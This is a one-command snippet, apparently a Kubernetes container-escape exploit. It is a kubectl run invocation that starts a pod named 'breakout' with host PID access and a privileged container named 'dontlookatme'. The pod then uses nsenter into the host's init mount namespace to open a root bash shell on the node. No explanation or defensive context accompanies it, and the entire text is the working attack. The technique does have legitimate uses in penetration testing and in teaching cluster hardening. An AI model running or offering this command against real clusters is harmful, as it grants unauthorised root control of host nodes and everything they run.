kubectl run breakout -ti \
--image=alpine \
--rm \
--overrides '{"spec":{"hostPID":true,
"containers":[{"name":"dontlookatme","image":"alpine","stdin":true,"tty":true,
"securityContext":{"privileged":true},
"command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"]}]}}'
